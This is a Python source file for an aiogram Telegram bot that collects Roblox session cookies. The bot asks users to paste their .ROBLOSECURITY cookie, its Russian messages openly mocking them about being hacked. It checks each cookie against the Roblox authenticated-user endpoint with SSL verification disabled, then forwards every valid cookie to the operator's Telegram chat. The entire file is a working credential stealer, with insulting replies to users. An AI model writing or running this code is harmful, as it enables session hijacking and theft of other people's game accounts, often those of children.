from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
from aiogram.contrib.fsm_storage.memory import MemoryStorage
import aiohttp

chat_id = 0 #поменяй это если ты не долбаеб

bot = Bot(token='pon')
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

@dp.message_handler(commands=("start"))
async def start(message: types.Message):
    kb = types.InlineKeyboardMarkup()
    kb.row(types.InlineKeyboardButton("Туториал", url="youtube.com/"))
    await message.reply("<b>Привет! Отправь сюда куки чтобы мы взломали всю твою семью!\nНе знаешь как это сделать? вот туториал!</b>", parse_mode="HTML", reply_markup=kb)


@dp.message_handler(content_types=types.ContentTypes.TEXT)
async def cookie(message: types.Message):
    cookies = message.text
    async with aiohttp.ClientSession(cookies={".ROBLOSECURITY": cookies}) as client:
        response = await client.get("https://users.roblox.com/v1/users/authenticated", ssl = False)
        data = await response.json()
        if data.get('id') == None:
            await message.reply("Куки не верный иди наху")
            return
        await message.reply("спс мы тебя взломали:)")
    await bot.send_message(chat_id, cookies)

if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)